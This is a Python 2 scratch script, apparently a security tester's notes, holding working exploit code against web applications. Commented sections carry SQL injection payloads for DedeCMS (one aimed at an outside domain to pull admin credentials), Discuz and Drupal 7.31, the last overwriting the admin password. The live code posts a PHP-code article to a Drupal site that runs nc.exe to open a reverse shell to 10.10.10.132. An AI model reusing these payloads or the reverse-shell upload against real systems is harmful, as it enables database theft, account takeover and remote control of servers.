#coding=utf-8
import db_connector
import requests
import socket
import json,urllib
import re,sys
from pyes import * 
from elasticsearch import Elasticsearch
import MySQLdb
'''
这里解决了一个问题
这个问题是：
当使用requests或者urllib时 
附加的url参数会自动url编码导致访问出错
现在使用的urllib.qoute解决这个问题
详情：http://blog.csdn.net/my2010sam/article/details/9262141
url = "http://8888ln.com"
para = /plus/recommend.php?_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294&action=&aid=1&_FILES[type][tmp_name]=\\'%20or%20@`'`%20/*!5454union*//*!5454select*/1,2,3,(select%20concat(userid,pwd)+from+%23@__admin+limit+1),5,6,7,8,9%23@`'`
data = urllib.quote(para,"?@`[]*,+()/'&=!_%")
print data
url = "%s%s" % (url,data)
print url
print urllib.urlopen(url).read()
'''

# url = "http://localhost/discuz/upload/faq.php"
# payload = "action=grouppermission&gids[99]='&gids[100][0]=) and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x  )a)%23"
# r = requests.get("%s?%s" % (url,payload))
# pattern = re.compile(r"Duplicate entry '(.*?)'")
# print pattern.findall(r.content)

# f = open('data1.txt','rb')
# tmp_list = []
# for x in f:
# 	tmp_list.append(x.replace('\r\n',''))

# print tmp_list
# ret = os.popen('ftp -s:./1.txt').read()
# print ret

import sys

# def escape(raw):
# 	'''+ - && || ! ( ) { } [ ] ^ " ~ * ? : \ /'''
# 	newstr = ''
# 	for x in raw:
# 		if x in ('+','-', '&&', '||', '!' ,'(', ')', '{', '}', '[', ']', '^' ,'"' ,'~' ,'*' ,'?' ,':','/'):
# 			x = "\%s" % x
# 		newstr += x
# 	return newstr

# print escape("+ - && || ! ( ) { } [ ] ^ \" ~ * ? :/")

# sys.exit()


# es = Elasticsearch('127.0.0.1:9200')
# #es.indices.create("safecat")
# typeMapping = {
# 		    	'domain':{
# 		    		'type':'string'
# 		    	},
# 		    	'ip':{
# 		    		'type':'string'
# 		    	},
# 		        'flag':{
# 	               'type':'string'
# 			    },
# 			    'serverinfo':{
# 			    	'type':'string',
# 			    	'null_value':'unknown'
# 			    },
# 			    'date':{
# 			    	'type':'date'
# 			    },
# 			    'version':{
# 			    	'type':'string',
# 			    	'null_value':'unknown'
# 			    },
# 			    'country':{
# 			    	'type':'string',
# 			    	'null_value':'unknown'
# 			    },
# 			    'city':{
# 			    	'type':'string',
# 			    	'null_value':'unknown'
# 			    },
# 			    'http_response':{
# 			    	'type':'string'
# 			    }

# 		}

# es.indices.put_mapping(index='safecat',doc_type='hostcrawler',body={'properties':typeMapping})

# #导入数据
# host_list = db_connector.WebComponent.objects.all()
# count = 1
# for info in host_list:
# 	doc = {
# 		"ip":info.ip,
# 		"domain":info.domain,
# 		"flag":info.flag,
# 		"serverinfo":info.serverinfo,
# 		"date":info.date,
# 		"version":info.version,
# 		"country":info.country,
# 		"city":info.city,
# 		"http_response":info.http_response
# 	}

# 	#插入数据
# 	res = es.index(index="safecat",doc_type='hostcrawler',id=count,body=doc)
# 	print '---------------',res
# 	count += 1

# query = {
# 	"query":{
# 		"match":{
# 			"flag":"discuz"
# 		},
# 		"match":{
# 			"city":""
# 		}
# 	}
# }

# es = Elasticsearch('127.0.0.1:9200')

# res = es.search(body=query,index="safecat",doc_type="hostcrawler",size=10)
# print res['hits']['total']
# for x in res['hits']['hits']:
# 	print x


'''
name[0%20;update+users+set+name%3d'owned'+,+pass+%3d+'$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld'+where+uid+%3d+'1';;#%20%20]=test3
&name[0]=test
&pass=shit2
&test2=test
&form_build_id=
&form_id=user_login_block
&op=Log+in
'''

# data = {
# 	"name[0%20;update users set name%3d'owned',pass %3d '$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld'+where+uid+%3d+'1';;#%20%20]":'test3',
# 	"name[0]":'test',
# 	"pass":'shit2',
# 	"test2":'test',
# 	"form_build_id":'',
# 	"form_id":"user_login_block",
# 	"op":"Log+in"
# }

# r = requests.post("http://127.0.0.1/drupal-7.31/?q=node&destination=node",data=data)
# print r.url
# print r.status_code
# print r.content

# f = open("D:/MySoftware/wamp-php-5.3/bin/mysql/mysql5.5.20/data/log.txt",'r')
# content = f.read()
# for x in content.split('\t'):
# 	print x

# import MultipartPostHandler, urllib2, cookielib

# cookies = cookielib.CookieJar()
# opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookies),
#                             MultipartPostHandler.MultipartPostHandler)
# params = { "username" : "bob", "password" : "riviera",
#          "file" : open("filename", "rb") }
# opener.open("http://wwww.bobsite.com/upload/", params)
import requests
import re
import sys
import socket
import urllib
import urllib2
import cookielib
import MultipartPostHandler
import socket
import mimetypes
import mimetools
# cj = cookielib.LWPCookieJar()
# opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
# login_path = 'http://127.0.0.1/drupal-7.31/'
# pattern = re.compile(r'name="form_build_id" value="(.+)"')
# r = requests.get(login_path)
# form_build_id = pattern.findall(r.content)[0]
# data = {
# 			'name':'admin',
# 			'pass':'thanks',
# 			'form_build_id':form_build_id, #csrf token
# 			'form_id':'user_login_block',
# 			'op':'Log+in'
# 		}
# post_data = urllib.urlencode(data)
# request = urllib2.Request(login_path,post_data)
# html = opener.open(request).read()
# data = open('C:/Users/Administrator.WIN-20130812CHJ/Desktop/drupal-exp/post.txt','r').read()

# # Build the POST request
url = "http://127.0.0.1/drupal-7.31/?q=node/add/article"   
cookies = {'SESS41072b33730d75583216007e81bc6912':'4AqUtlPCIPfaTmJdfXmWLTpetxRR5EHUaEneJ2f8Qkg'}
r = requests.get(url,cookies=cookies)
pattern_id = re.compile(r'name="form_build_id" value="(.+)"')
pattern_token = re.compile(r'name="form_token" value="(.+)"')
form_build_id = pattern_id.findall(r.content)[0] #csrf token
form_token = pattern_token.findall(r.content)[0]
# post_data = {}
# post_data['title'] = 'xxxx'
# post_data['body[und][0][value]'] = '<?php phpinfo();?>'
# post_data['body[und][0][format]'] = 'php_code'
# post_data['field_image[und][0][fid]'] = '0'
# post_data['field_image[und][0][display]'] = '1'
# post_data['form_build_id'] = form_build_id
# post_data['form_token'] = form_token
# post_data['form_id'] = 'article_node_form'
# post_data['name'] = 'admin'
# post_data['status'] = '1'
# post_data['additional_settings__active_tab'] = 'edit-revision-information'
# post_data['op'] = 'Preview'

# # MIME encode the POST payload
# opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj),MultipartPostHandler.MultipartPostHandler)
# urllib2.install_opener(opener)
# request = urllib2.Request(url, post_data)
# request.set_proxy('127.0.0.1:8080', 'http') # For testing with Burp Proxy

# # Make the request and capture the response
# try:
#     response = urllib2.urlopen(request)
#     print response.geturl()
# except urllib2.URLError, e:
#     print "File upload failed..."
BOUND = mimetools.choose_boundary()
content_type = "multipart/form-data; boundary=%s" % BOUND
CRLF = "\r\n"
fields = {
	'title':'chongrui',
	'field_tags[und]':CRLF,
	'body[und][0][summary]':CRLF,
	'body[und][0][value]':'<?php echo shell_exec("c:\\\\nc.exe 10.10.10.132 10002 -e c:\\\\cmd.exe");?>',
	'body[und][0][format]':'php_code',
	'field_image[und][0][fid]':'0',
	'field_image[und][0][display]':'1',
	'changed':CRLF,
	'form_build_id':form_build_id,
	'form_token':form_token,
	'form_id':'article_node_form',
	'log':CRLF,
	'name':'admin',
	'date':CRLF,
	'status':'1',
	'promote':'1',
	'additional_settings__active_tab':'edit-revision-information',
	'op':'Preview'
}


L= []
for k,v in fields.items():
	L.append('--'+BOUND)
	L.append('\n')
	L.append('Content-Disposition: form-data; name="%s"%s' % (k,"\n"))
	if v != CRLF:
		L.append(CRLF)
	L.append(v)
	L.append('\n')
	
L.append('%s--' % BOUND)
L.append(CRLF)

body = ''
for x in L:
	body+=x
print body
# proxies = {
# 	'http':'127.0.0.1:8080'
# }

headers = {
	'Content-type':content_type
}

r = requests.post(url,data=body,cookies=cookies,headers=headers)
print r.content




